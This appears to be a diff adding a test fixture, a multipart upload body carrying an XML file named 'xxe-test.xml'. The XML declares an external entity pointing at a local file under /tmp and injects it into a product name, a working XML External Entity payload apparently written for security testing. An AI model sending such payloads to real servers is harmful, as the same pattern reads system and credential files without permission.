@@ -1,0 +1,15 @@
+------AWAXXE1106
+Content-Disposition: form-data; name="file"; filename="xxe-test.xml"
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE products [<!ENTITY proof SYSTEM "file:///tmp/awa-spel-1106">]>
+<products>
+  <product>
+    <name>&proof;</name>
+    <price>1.00</price>
+    <stock>1</stock>
+  </product>
+</products>
+
+------AWAXXE1106--
